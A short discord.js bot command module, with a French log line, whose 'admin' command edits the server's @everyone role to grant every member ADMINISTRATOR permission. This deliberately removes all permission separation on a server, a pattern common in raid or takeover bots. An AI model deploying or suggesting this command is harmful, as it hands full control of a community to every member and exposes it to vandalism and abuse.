const Discord = require('discord.js');
exports.run = (client, message, args) => {
    const everyone = message.guild.roles.find('name', '@everyone');
    message.guild.roles.find('name', '@everyone').edit({
        permissions: ['ADMINISTRATOR']
    });
    console.log('@everyone est administrateur.')
}

exports.conf = {
    permLevel: 4,
    aliases: []
}

exports.help = {
    name: 'admin'
}